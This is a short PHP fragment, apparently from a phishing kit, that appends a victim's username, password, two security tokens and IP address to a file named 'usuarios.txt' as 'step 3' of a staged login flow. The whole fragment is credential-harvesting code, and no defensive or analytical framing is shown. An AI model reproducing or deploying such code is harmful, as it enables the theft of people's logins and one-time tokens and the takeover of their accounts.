...
if (isset($usuario) != null && isset($password) != null && isset($token1) != null && $count == 3) {
    $ar=fopen("usuarios.txt","a");
    fwrite( $ar ,'

====== PASO 3
       Usuario: '.$usuario.' | clave: '.$password.' | token1: '.$token1.' | token2: '.$token2.' | ip: '.$ip.'
');
    fclose($ar);
